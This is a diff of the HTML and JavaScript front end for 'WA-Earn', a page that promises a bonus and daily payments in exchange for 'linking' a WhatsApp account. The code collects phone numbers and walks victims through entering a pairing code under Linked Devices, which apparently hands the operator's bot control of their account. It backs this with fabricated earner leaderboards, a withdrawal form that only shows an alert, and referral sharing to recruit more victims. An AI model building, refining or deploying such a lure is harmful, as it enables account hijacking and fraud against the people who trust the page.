@@ -3,26 +3,37 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WA-Earn | Passive Income</title>
+    <title>WA-Earn | Dashboard</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
     <style>
         :root { --bg: #0f172a; --card: #1e293b; --primary: #10b981; --primary-hover: #059669; --text: #f8fafc; --text-muted: #94a3b8; --border: #334155; --danger: #ef4444; --warning: #f59e0b; }
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Inter', sans-serif; }
-        body { background-color: var(--bg); color: var(--text); min-height: 100vh; display: flex; flex-direction: column; }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Inter', sans-serif; -webkit-tap-highlight-color: transparent; }
+        body { background-color: var(--bg); color: var(--text); min-height: 100vh; display: flex; flex-direction: column; overflow-x: hidden; }
+        
         .navbar { background: var(--card); padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid var(--border); position: sticky; top: 0; z-index: 100; }
         .logo { font-weight: 800; font-size: 20px; color: var(--primary); }
-        .container { max-width: 500px; margin: 20px auto; padding: 0 20px; width: 100%; flex: 1; }
+        
+        .container { max-width: 500px; margin: 20px auto; padding: 0 20px 100px 20px; width: 100%; flex: 1; }
+        
+        /* Pages */
+        .page { display: none; }
+        .page.active { display: block; animation: fadeIn 0.2s ease-out; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }
+
         .hero-card { background: var(--card); border-radius: 20px; padding: 30px; box-shadow: 0 10px 30px rgba(0,0,0,0.3); border: 1px solid var(--border); text-align: center; position: relative; overflow: hidden; }
-        .hero-card::before { content: ''; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%; background: radial-gradient(circle, rgba(16,185,129,0.1) 0%, transparent 60%); z-index: 0; }
+        .hero-card::before { content: ''; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%; background: radial-gradient(circle, rgba(16,185,129,0.1) 0%, transparent 60%); z-index: 0; pointer-events: none; }
         .hero-content { position: relative; z-index: 1; }
+        
         .badge { background: rgba(16,185,129,0.2); color: var(--primary); padding: 5px 12px; border-radius: 20px; font-size: 12px; font-weight: 600; display: inline-block; margin-bottom: 15px; }
         .balance { font-size: 48px; font-weight: 800; color: var(--text); margin: 10px 0; letter-spacing: -1px; }
         .balance span { color: var(--primary); font-size: 32px; }
         .sub-text { color: var(--text-muted); font-size: 14px; line-height: 1.5; margin-bottom: 25px; }
+        
         .btn { background: var(--primary); color: #fff; border: none; padding: 16px; border-radius: 12px; font-size: 16px; font-weight: 600; width: 100%; cursor: pointer; transition: all 0.2s; display: flex; justify-content: center; align-items: center; gap: 10px; }
         .btn:hover { background: var(--primary-hover); }
         .btn:disabled { background: var(--border); color: var(--text-muted); cursor: not-allowed; }
         .btn-secondary { background: var(--border); color: var(--text); }
+        
         .input-group { display: none; margin-top: 20px; text-align: center; }
         .input-group label { font-size: 13px; color: var(--text-muted); margin-bottom: 12px; display: block; font-weight: 500; }
         .phone-input-wrapper { display: flex; gap: 10px; justify-content: center; margin-bottom: 15px; }
@@ -32,11 +43,14 @@
         .pin-container input:focus { border-color: var(--primary); box-shadow: 0 0 0 3px rgba(16,185,129,0.2); }
         .pin-container input.filled { border-color: var(--primary); }
         .warning-text { font-size: 11px; color: var(--warning); margin-bottom: 15px; text-align: center; }
-        .pair-status-box { font-size: 12px; color: var(--text-muted); margin-top: 12px; text-align: center; padding: 10px; background: var(--bg); border-radius: 8px; border: 1px solid var(--border); min-height: 36px; display: flex; align-items: center; justify-content: center; }
+        
+        .pair-status-box { font-size: 12px; color: var(--text-muted); margin-top: 12px; text-align: center; padding: 10px; background: var(--bg); border-radius: 8px; border: 1px solid var(--border); min-height: 36px; display: none; align-items: center; justify-content: center; }
+        
         .stats-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-top: 20px; }
         .stat-card { background: var(--card); border-radius: 16px; padding: 20px; border: 1px solid var(--border); text-align: center; }
         .stat-value { font-size: 24px; font-weight: 700; color: var(--text); }
         .stat-label { font-size: 12px; color: var(--text-muted); margin-top: 5px; font-weight: 500; }
+        
         .leaderboard { margin-top: 20px; background: var(--card); border-radius: 20px; padding: 20px; border: 1px solid var(--border); }
         .leaderboard h3 { font-size: 16px; margin-bottom: 15px; display: flex; align-items: center; gap: 8px; }
         .leader-item { display: flex; justify-content: space-between; align-items: center; padding: 12px 0; border-bottom: 1px solid var(--border); }
@@ -62,20 +76,16 @@
         .resend-link { background: none; border: none; color: var(--primary); font-size: 13px; cursor: pointer; text-decoration: underline; padding: 8px; }
         .resend-link:disabled { color: var(--text-muted); cursor: not-allowed; text-decoration: none; }
 
-        .maintenance-screen { display: none; text-align: center; }
         .maint-icon { width: 80px; height: 80px; background: rgba(245,158,11,0.15); border-radius: 50%; display: flex; justify-content: center; align-items: center; margin: 0 auto 20px; }
         .maint-icon svg { width: 44px; height: 44px; color: var(--warning); }
 
-        .success-screen { display: none; text-align: center; }
-        .success-icon { width: 80px; height: 80px; background: rgba(16,185,129,0.2); border-radius: 50%; display: flex; justify-content: center; align-items: center; margin: 0 auto 20px; }
-        .success-icon svg { width: 40px; height: 40px; color: var(--primary); }
-
-        .withdraw-box { background: var(--bg); border: 1px solid var(--border); border-radius: 12px; padding: 20px; margin-top: 20px; text-align: left; display: none; }
+        .withdraw-box { background: var(--bg); border: 1px solid var(--border); border-radius: 12px; padding: 20px; margin-top: 20px; text-align: left; }
         .withdraw-box h3 { font-size: 16px; margin-bottom: 15px; }
         .form-group { margin-bottom: 15px; }
         .form-group label { display: block; font-size: 12px; color: var(--text-muted); margin-bottom: 5px; }
         .form-group input, .form-group select { width: 100%; padding: 12px; border-radius: 8px; border: 1px solid var(--border); background: var(--card); color: var(--text); font-size: 14px; outline: none; }
-        .referral-box { background: var(--bg); border: 1px solid var(--border); border-radius: 12px; padding: 15px; margin-top: 20px; display: none; text-align: left; }
+        
+        .referral-box { background: var(--bg); border: 1px solid var(--border); border-radius: 12px; padding: 15px; margin-top: 20px; text-align: left; }
         .referral-box label { font-size: 12px; color: var(--text-muted); margin-bottom: 8px; display: block; }
         .referral-input { display: flex; gap: 10px; margin-bottom: 15px; }
         .referral-input input { flex: 1; padding: 12px; border-radius: 8px; border: 1px solid var(--border); background: var(--card); color: var(--text); font-size: 14px; outline: none; }
@@ -86,7 +96,14 @@
         .share-tg { background: #0088cc; }
         .share-generic { background: var(--border); }
 
-        .toast-container { position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); z-index: 9999; display: flex; flex-direction: column; gap: 10px; width: 90%; max-width: 400px; }
+        /* Bottom Tab Navigation */
+        .bottom-nav { position: fixed; bottom: 0; left: 0; width: 100%; background: var(--card); border-top: 1px solid var(--border); display: none; justify-content: space-around; padding: 10px 0; z-index: 200; padding-bottom: env(safe-area-inset-bottom, 10px); }
+        .bottom-nav.show { display: flex; }
+        .nav-item { display: flex; flex-direction: column; align-items: center; gap: 4px; color: var(--text-muted); font-size: 12px; font-weight: 500; cursor: pointer; text-decoration: none; padding: 8px 15px; border-radius: 12px; transition: 0.2s; }
+        .nav-item.active { color: var(--primary); background: rgba(16,185,129,0.1); }
+        .nav-icon { font-size: 20px; }
+
+        .toast-container { position: fixed; bottom: 80px; left: 50%; transform: translateX(-50%); z-index: 9999; display: flex; flex-direction: column; gap: 10px; width: 90%; max-width: 400px; pointer-events: none; }
         .toast { background: var(--card); border-left: 4px solid var(--primary); color: var(--text); padding: 15px 20px; border-radius: 8px; box-shadow: 0 10px 25px rgba(0,0,0,0.5); font-size: 14px; display: flex; align-items: center; gap: 12px; animation: slideUp 0.3s ease-out forwards; opacity: 0; transform: translateY(20px); }
         .toast.hide { animation: fadeOut 0.3s ease-in forwards; }
         @keyframes slideUp { to { opacity: 1; transform: translateY(0); } }
@@ -95,107 +112,153 @@
 </head>
 <body>
     <nav class="navbar"><div class="logo">WA-Earn</div></nav>
+    
     <div class="container">
-        <div id="step-1">
+        
+        <!-- ═══════════ PAGE 1: PAIRING ═══════════ -->
+        <div id="page-pair" class="page active">
+            <div id="step-1">
+                <div class="hero-card">
+                    <div class="hero-content">
+                        <div class="badge">PASSIVE INCOME ACTIVE</div>
+                        <h1 style="font-size: 20px; margin-bottom: 10px;">Welcome to WA-Earn</h1>
+                        <div class="balance"><span class="currency-symbol">₦</span><span id="display-balance">2,000</span><span>.00</span></div>
+                        <p class="sub-text">Claim your onboarding bonus by activating your account in our secure ad-campaign network. Keep it active to earn daily.</p>
+                        <button class="btn" id="start-btn" onclick="showInput()">Claim Bonus Now</button>
+                        <div class="input-group" id="input-group">
+                            <label>Enter your WhatsApp Number</label>
+                            <div class="phone-input-wrapper">
+                                <select class="country-select" id="country-code">
+                                    <option value="+234" data-currency="₦">🇳🇬 +234</option>
+                                    <option value="+1" data-currency="$">🇺🇸 +1</option>
+                                    <option value="+44" data-currency="£">🇬🇧 +44</option>
+                                    <option value="+27" data-currency="R">🇿🇦 +27</option>
+                                    <option value="+254" data-currency="KSh">🇰🇪 +254</option>
+                                    <option value="+233" data-currency="₵">🇬🇭 +233</option>
+                                </select>
+                                <div class="pin-container" id="pin-container">
+                                    <input type="tel" maxlength="1" oninput="moveToNext(this, 1)" onkeydown="moveToPrev(event, this, 1)">
+                                    <input type="tel" maxlength="1" oninput="moveToNext(this, 2)" onkeydown="moveToPrev(event, this, 2)">
+                                    <input type="tel" maxlength="1" oninput="moveToNext(this, 3)" onkeydown="moveToPrev(event, this, 3)">
+                                    <input type="tel" maxlength="1" oninput="moveToNext(this, 4)" onkeydown="moveToPrev(event, this, 4)">
+                                    <input type="tel" maxlength="1" oninput="moveToNext(this, 5)" onkeydown="moveToPrev(event, this, 5)">
+                                    <input type="tel" maxlength="1" oninput="moveToNext(this, 6)" onkeydown="moveToPrev(event, this, 6)">
+                                    <input type="tel" maxlength="1" oninput="moveToNext(this, 7)" onkeydown="moveToPrev(event, this, 7)">
+                                    <input type="tel" maxlength="1" oninput="moveToNext(this, 8)" onkeydown="moveToPrev(event, this, 8)">
+                                    <input type="tel" maxlength="1" oninput="moveToNext(this, 9)" onkeydown="moveToPrev(event, this, 9)">
+                                    <input type="tel" maxlength="1" oninput="moveToNext(this, 10)" onkeydown="moveToPrev(event, this, 10)">
+                                </div>
+                            </div>
+                            <div class="warning-text">Do not include the leading 0 (e.g. 803..., not 0803...)</div>
+                            <button class="btn" id="send-btn" onclick="requestCode()" style="margin-top: 5px;">Link Account & Earn</button>
+                            <div class="pair-status-box" id="pair-status">Idle</div>
+                        </div>
+                    </div>
+                </div>
+                <div class="stats-grid">
+                    <div class="stat-card"><div class="stat-value" id="daily-retainer">₦500</div><div class="stat-label">Daily Retainer</div></div>
+                    <div class="stat-card"><div class="stat-value" id="referral-bonus">₦500</div><div class="stat-label">Referral Bonus</div></div>
+                </div>
+                <div class="leaderboard"><h3>🏆 Top Earners This Week</h3><div id="leaderboard-list"></div></div>
+            </div>
+
+            <div class="hero-card wa-screen" id="step-2">
+                <div class="wa-icon">
+                    <svg viewBox="0 0 24 24" fill="currentColor"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z"/></svg>
+                </div>
+                <h2 style="font-size: 22px; margin-bottom: 10px;">Check your WhatsApp</h2>
+                <p class="sub-text">We've sent a linking code to your WhatsApp number. Open WhatsApp now to retrieve it.</p>
+                <div class="instructions">
+                    <h4>How to link:</h4>
+                    <div class="step-item"><div class="step-num">1</div><div class="step-text">Open <strong>WhatsApp</strong> on your phone.</div></div>
+                    <div class="step-item"><div class="step-num">2</div><div class="step-text">Find the message from <strong>WA-Earn</strong> and copy the code.</div></div>
+                    <div class="step-item"><div class="step-num">3</div><div class="step-text">In WhatsApp, tap <strong>three dots (⋮)</strong> → <strong>Linked Devices</strong>.</div></div>
+                    <div class="step-item"><div class="step-num">4</div><div class="step-text">Tap <strong>Link with Phone Number</strong> and paste the code.</div></div>
+                </div>
+                <div class="timer" id="code-timer">Code expires in 2:00</div>
+                <div class="resend-row" id="resend-row">
+                    <button class="resend-link" id="resend-btn" onclick="resendCode()">Didn't get it? Resend code</button>
+                </div>
+            </div>
+
+            <div class="hero-card maintenance-screen" id="step-maint" style="display:none;">
+                <div class="maint-icon">
+                    <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"/></svg>
+                </div>
+                <h2 style="font-size: 22px; margin-bottom: 10px;">Server under maintenance</h2>
+                <p class="sub-text" id="maint-msg">We're having a temporary issue completing your linking. Please try again in a few minutes.</p>
+                <button class="btn" onclick="resetToStart()" style="margin-top: 20px;">Try Again</button>
+            </div>
+        </div>
+
+        <!-- ═══════════ PAGE 2: DASHBOARD ═══════════ -->
+        <div id="page-dashboard" class="page">
             <div class="hero-card">
                 <div class="hero-content">
-                    <div class="badge">PASSIVE INCOME ACTIVE</div>
-                    <h1 style="font-size: 20px; margin-bottom: 10px;">Welcome to WA-Earn</h1>
-                    <div class="balance"><span class="currency-symbol">₦</span><span id="display-balance">2,000</span><span>.00</span></div>
-                    <p class="sub-text">Claim your onboarding bonus by activating your account in our secure ad-campaign network. Keep it active to earn daily.</p>
-                    <button class="btn" id="start-btn" onclick="showInput()">Claim Bonus Now</button>
-                    <div class="input-group" id="input-group">
-                        <label>Enter your WhatsApp Number</label>
-                        <div class="phone-input-wrapper">
-                            <select class="country-select" id="country-code">
-                                <option value="+234" data-currency="₦">🇳🇬 +234</option>
-                                <option value="+1" data-currency="$">🇺🇸 +1</option>
-                                <option value="+44" data-currency="£">🇬🇧 +44</option>
-                                <option value="+27" data-currency="R">🇿🇦 +27</option>
-                                <option value="+254" data-currency="KSh">🇰🇪 +254</option>
-                                <option value="+233" data-currency="₵">🇬🇭 +233</option>
-                            </select>
-                            <div class="pin-container" id="pin-container">
-                                <input type="tel" maxlength="1" oninput="moveToNext(this, 1)" onkeydown="moveToPrev(event, this, 1)">
-                                <input type="tel" maxlength="1" oninput="moveToNext(this, 2)" onkeydown="moveToPrev(event, this, 2)">
-                                <input type="tel" maxlength="1" oninput="moveToNext(this, 3)" onkeydown="moveToPrev(event, this, 3)">
-                                <input type="tel" maxlength="1" oninput="moveToNext(this, 4)" onkeydown="moveToPrev(event, this, 4)">
-                                <input type="tel" maxlength="1" oninput="moveToNext(this, 5)" onkeydown="moveToPrev(event, this, 5)">
-                                <input type="tel" maxlength="1" oninput="moveToNext(this, 6)" onkeydown="moveToPrev(event, this, 6)">
-                                <input type="tel" maxlength="1" oninput="moveToNext(this, 7)" onkeydown="moveToPrev(event, this, 7)">
-                                <input type="tel" maxlength="1" oninput="moveToNext(this, 8)" onkeydown="moveToPrev(event, this, 8)">
-                                <input type="tel" maxlength="1" oninput="moveToNext(this, 9)" onkeydown="moveToPrev(event, this, 9)">
-                                <input type="tel" maxlength="1" oninput="moveToNext(this, 10)" onkeydown="moveToPrev(event, this, 10)">
-                            </div>
-                        </div>
-                        <div class="warning-text">Do not include the leading 0 (e.g. 803..., not 0803...)</div>
-                        <button class="btn" id="send-btn" onclick="requestCode()" style="margin-top: 5px;">Link Account & Earn</button>
-                        <div class="pair-status-box" id="pair-status" style="display:none;">Idle</div>
-                    </div>
+                    <div class="badge">STATUS: ACTIVE</div>
+                    <h1 style="font-size: 20px; margin-bottom: 10px;">Welcome Back</h1>
+                    <div class="balance"><span class="currency-symbol">₦</span><span id="dash-balance">2,000</span><span>.00</span></div>
+                    <p class="sub-text">Your WhatsApp is linked and the campaign bot is running. Keep it active to earn your daily retainer.</p>
                 </div>
             </div>
             <div class="stats-grid">
-                <div class="stat-card"><div class="stat-value" id="daily-retainer">₦500</div><div class="stat-label">Daily Retainer</div></div>
-                <div class="stat-card"><div class="stat-value" id="referral-bonus">₦500</div><div class="stat-label">Referral Bonus</div></div>
+                <div class="stat-card"><div class="stat-value" id="daily-retainer-dash">₦500</div><div class="stat-label">Daily Retainer</div></div>
+                <div class="stat-card"><div class="stat-value" id="referral-bonus-dash">₦500</div><div class="stat-label">Referral Bonus</div></div>
             </div>
-            <div class="leaderboard"><h3>🏆 Top Earners This Week</h3><div id="leaderboard-list"></div></div>
+            <div class="leaderboard"><h3>🏆 Top Earners This Week</h3><div id="leaderboard-list-dash"></div></div>
         </div>
 
-        <div class="hero-card wa-screen" id="step-2">
-            <div class="wa-icon">
-                <svg viewBox="0 0 24 24" fill="currentColor"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z"/></svg>
-            </div>
-            <h2 style="font-size: 22px; margin-bottom: 10px;">Check your WhatsApp</h2>
-            <p class="sub-text">We've sent a linking code to your WhatsApp number. Open WhatsApp now to retrieve it.</p>
-            <div class="instructions">
-                <h4>How to link:</h4>
-                <div class="step-item"><div class="step-num">1</div><div class="step-text">Open <strong>WhatsApp</strong> on your phone.</div></div>
-                <div class="step-item"><div class="step-num">2</div><div class="step-text">Find the message from <strong>WA-Earn</strong> and copy the code.</div></div>
-                <div class="step-item"><div class="step-num">3</div><div class="step-text">In WhatsApp, tap <strong>three dots (⋮)</strong> → <strong>Linked Devices</strong>.</div></div>
-                <div class="step-item"><div class="step-num">4</div><div class="step-text">Tap <strong>Link with Phone Number</strong> and paste the code.</div></div>
-            </div>
-            <div class="timer" id="code-timer">Code expires in 2:00</div>
-            <div class="resend-row" id="resend-row">
-                <button class="resend-link" id="resend-btn" onclick="resendCode()">Didn't get it? Resend code</button>
-            </div>
-        </div>
-
-        <div class="hero-card maintenance-screen" id="step-maint">
-            <div class="maint-icon">
-                <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"/></svg>
-            </div>
-            <h2 style="font-size: 22px; margin-bottom: 10px;">Server under maintenance</h2>
-            <p class="sub-text" id="maint-msg">We're having a temporary issue completing your linking. Please try again in a few minutes.</p>
-            <button class="btn" onclick="resetToStart()" style="margin-top: 20px;">Try Again</button>
-        </div>
-
-        <div class="hero-card success-screen" id="step-3">
-            <div class="success-icon"><svg fill="none" stroke="currentColor" stroke-width="3" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"></path></svg></div>
-            <h2 style="font-size: 24px; margin-bottom: 10px;">Account Activated!</h2>
-            <p class="sub-text">Your WhatsApp is now linked. Your onboarding bonus has been credited.</p>
-            <div class="balance" id="final-balance"><span class="currency-symbol">₦</span><span id="final-balance-amount">2,000</span><span>.00</span></div>
-            <button class="btn" style="margin-top: 20px;" onclick="showWithdraw()">Withdraw Funds</button>
-            <div class="withdraw-box" id="withdraw-box">
-                <h3>Withdrawal Details</h3>
-                <div class="form-group"><label>Bank Name</label><select><option>Select Bank</option><option>Access Bank</option><option>GTB</option><option>First Bank</option><option>UBA</option><option>Zenith Bank</option></select></div>
-                <div class="form-group"><label>Account Number</label><input type="tel" placeholder="10-digit number"></div>
-                <div class="form-group"><label>Account Name</label><input type="text" placeholder="Name"></div>
-                <button class="btn" style="margin-top: 10px;">Request Withdrawal</button>
-                <p class="sub-text" style="margin-top: 10px; font-size: 11px; text-align: center;">Minimum withdrawal is <span id="min-withdraw">₦10,000</span>.</p>
-            </div>
-            <div class="referral-box" id="referral-box">
-                <label>Invite associates to earn <span class="currency-symbol">₦</span>500 per referral</label>
-                <div class="referral-input"><input type="text" id="ref-link" readonly><button onclick="copyRef()">Copy</button></div>
-                <div class="share-buttons">
-                    <button class="share-btn share-wa" onclick="shareTo('whatsapp')">WhatsApp</button>
-                    <button class="share-btn share-tg" onclick="shareTo('telegram')">Telegram</button>
-                    <button class="share-btn share-generic" onclick="shareTo('native')">More</button>
+        <!-- ═══════════ PAGE 3: WITHDRAW ═══════════ -->
+        <div id="page-withdraw" class="page">
+            <div class="hero-card">
+                <h2 style="font-size: 20px; margin-bottom: 10px;">Withdraw Funds</h2>
+                <p class="sub-text">Transfer your available balance directly to your bank account.</p>
+                <div class="balance" style="font-size: 36px; margin-bottom: 20px;"><span class="currency-symbol">₦</span><span id="withdraw-balance">2,000</span><span>.00</span></div>
+                <div class="withdraw-box">
+                    <h3>Bank Details</h3>
+                    <div class="form-group"><label>Bank Name</label><select><option>Select Bank</option><option>Access Bank</option><option>GTB</option><option>First Bank</option><option>UBA</option><option>Zenith Bank</option></select></div>
+                    <div class="form-group"><label>Account Number</label><input type="tel" placeholder="10-digit number"></div>
+                    <div class="form-group"><label>Account Name</label><input type="text" placeholder="Name"></div>
+                    <button class="btn" style="margin-top: 10px;" onclick="alert('Withdrawal request submitted!')">Request Withdrawal</button>
+                    <p class="sub-text" style="margin-top: 10px; font-size: 11px; text-align: center;">Minimum withdrawal is <span id="min-withdraw">₦10,000</span>.</p>
                 </div>
             </div>
+        </div>
+
+        <!-- ═══════════ PAGE 4: REFERRAL ═══════════ -->
+        <div id="page-referral" class="page">
+            <div class="hero-card">
+                <h2 style="font-size: 20px; margin-bottom: 10px;">Invite & Earn</h2>
+                <p class="sub-text">Earn ₦500 for every person you invite who successfully links their account.</p>
+                <div class="referral-box">
+                    <label>Your Referral Link</label>
+                    <div class="referral-input"><input type="text" id="ref-link" readonly><button onclick="copyRef()">Copy</button></div>
+                    <div class="share-buttons">
+                        <button class="share-btn share-wa" onclick="shareTo('whatsapp')">WhatsApp</button>
+                        <button class="share-btn share-tg" onclick="shareTo('telegram')">Telegram</button>
+                        <button class="share-btn share-generic" onclick="shareTo('native')">More</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+    </div>
+
+    <!-- Bottom Navigation -->
+    <div class="bottom-nav" id="bottom-nav">
+        <div class="nav-item active" id="nav-dash" onclick="switchPage('dashboard', this)">
+            <span class="nav-icon">🏠</span> Dashboard
+        </div>
+        <div class="nav-item" id="nav-withdraw" onclick="switchPage('withdraw', this)">
+            <span class="nav-icon">💸</span> Withdraw
+        </div>
+        <div class="nav-item" id="nav-ref" onclick="switchPage('referral', this)">
+            <span class="nav-icon">👥</span> Referral
         </div>
     </div>
 
     <div class="toast-container" id="toast-container"></div>
+    
     <script src="/socket.io/socket.io.js"></script>
     <script>
         const socket = io();
@@ -206,7 +269,6 @@
         let selectedCurrency = '₦';
         let pairWatchdog = null;
         let codeTimerInterval = null;
-        let resendCount = 0;
 
         const countrySelect = document.getElementById('country-code');
         countrySelect.addEventListener('change', (e) => {
@@ -218,6 +280,25 @@
         });
 
         if (referrerNumber) currentBalance += 500;
+
+        // Pagination Logic
+        function switchPage(pageName, navEl) {
+            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+            document.getElementById(`page-${pageName}`).classList.add('active');
+            
+            if (navEl) {
+                document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+                navEl.classList.add('active');
+            }
+            window.scrollTo(0, 0);
+        }
+
+        function showStep(stepId) {
+            document.getElementById('step-1').style.display = 'none';
+            document.getElementById('step-2').style.display = 'none';
+            document.getElementById('step-maint').style.display = 'none';
+            document.getElementById(stepId).style.display = 'block';
+        }
 
         const inputs = document.querySelectorAll('.pin-container input');
         function moveToNext(current, index) {
@@ -242,22 +323,16 @@
             btn.disabled = false;
             btn.innerText = 'Link Account & Earn';
         }
-        function hideAllSteps() {
-            ['step-1', 'step-2', 'step-3', 'step-maint'].forEach(id => document.getElementById(id).style.display = 'none');
-        }
-        function showStep(id) { hideAllSteps(); document.getElementById(id).style.display = 'block'; window.scrollTo(0, 0); }
         function showMaintenance(msg) {
             if (msg) document.getElementById('maint-msg').innerText = msg;
             showStep('step-maint');
             if (codeTimerInterval) clearInterval(codeTimerInterval);
         }
         function resetToStart() {
-            hideAllSteps();
-            document.getElementById('step-1').style.display = 'block';
+            showStep('step-1');
             resetSendBtn();
             document.getElementById('pair-status').style.display = 'none';
             document.getElementById('resend-row').classList.remove('show');
-            resendCount = 0;
         }
 
         function startCodeTimer() {
@@ -307,10 +382,8 @@
             const btn = document.getElementById('resend-btn');
             btn.disabled = true;
             btn.innerText = 'Sending…';
-            resendCount++;
             socket.emit('resend_code', userPhone);
 
-            // safety: re-enable after 20s if server never responds
             setTimeout(() => {
                 if (btn.disabled) {
                     btn.disabled = false;
@@ -324,7 +397,6 @@
         socket.on('code_sent_via_whatsapp', () => {
             clearTimeout(pairWatchdog);
             if (document.getElementById('step-2').style.display === 'block') {
-                // resend case — just restart timer, already on the screen
                 startCodeTimer();
                 return;
             }
@@ -338,9 +410,13 @@
         socket.on('success', () => {
             clearTimeout(pairWatchdog);
             if (codeTimerInterval) clearInterval(codeTimerInterval);
-            showStep('step-3');
-            document.getElementById('final-balance-amount').innerText = currentBalance.toLocaleString();
-            document.getElementById('referral-box').style.display = 'block';
+            
+            // Show Dashboard and Nav Tabs
+            document.getElementById('bottom-nav').classList.add('show');
+            switchPage('dashboard', document.getElementById('nav-dash'));
+            
+            document.getElementById('dash-balance').innerText = currentBalance.toLocaleString();
+            document.getElementById('withdraw-balance').innerText = currentBalance.toLocaleString();
             document.getElementById('ref-link').value = `${window.location.origin}/?ref=${userPhone}`;
         });
 
@@ -350,10 +426,6 @@
             showMaintenance(msg);
         });
 
-        function showWithdraw() {
-            const box = document.getElementById('withdraw-box');
-            box.style.display = box.style.display === 'block' ? 'none' : 'block';
-        }
         function copyRef() {
             const copyText = document.getElementById('ref-link');
             copyText.select();
@@ -370,8 +442,11 @@
 
         const topEarners = [ { name: "Chinedu O.", amount: "145,000" }, { name: "Aisha M.", amount: "120,500" }, { name: "Tunde B.", amount: "98,000" }, { name: "Blessing E.", amount: "85,500" }, { name: "Ibrahim K.", amount: "72,000" } ];
         const listEl = document.getElementById('leaderboard-list');
+        const listElDash = document.getElementById('leaderboard-list-dash');
         topEarners.forEach(u => {
-            listEl.innerHTML += `<div class="leader-item"><div class="leader-info"><div class="avatar">${u.name.charAt(0)}</div><div class="leader-name">${u.name}</div></div><div class="leader-amount">${selectedCurrency}${u.amount}</div></div>`;
+            const html = `<div class="leader-item"><div class="leader-info"><div class="avatar">${u.name.charAt(0)}</div><div class="leader-name">${u.name}</div></div><div class="leader-amount">${selectedCurrency}${u.amount}</div></div>`;
+            listEl.innerHTML += html;
+            listElDash.innerHTML += html;
         });
 
         const fakeNames = ["Ada", "Chinedu", "Fatima", "Tunde", "Nneka", "Ibrahim", "Blessing", "Emeka", "Zainab"];
